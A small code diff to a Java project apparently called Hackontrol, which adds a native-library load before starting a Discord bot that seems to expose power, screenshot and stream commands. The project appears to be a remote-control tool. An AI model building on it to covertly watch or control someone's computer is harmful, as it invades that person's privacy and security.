@@ -15,6 +15,7 @@ import com.khopan.hackontrol.command.PowerCommand;
 import com.khopan.hackontrol.command.ScreenshotCommand;
 import com.khopan.hackontrol.command.SelectCommand;
 import com.khopan.hackontrol.command.StreamCommand;
+import com.khopan.hackontrol.nativelib.Native;
 import com.khopan.hackontrol.source.CommandSource;
 import com.khopan.hackontrol.source.DefaultCommandSource;
 import com.mojang.brigadier.CommandDispatcher;
@@ -116,6 +117,7 @@ public class Hackontrol {
 	}
 
 	public static void main(String[] args) {
+		Native.load();
 		JDA bot = JDABuilder.createDefault(Token.BOT_TOKEN)
 				.enableIntents(GatewayIntent.MESSAGE_CONTENT)
 				.build();
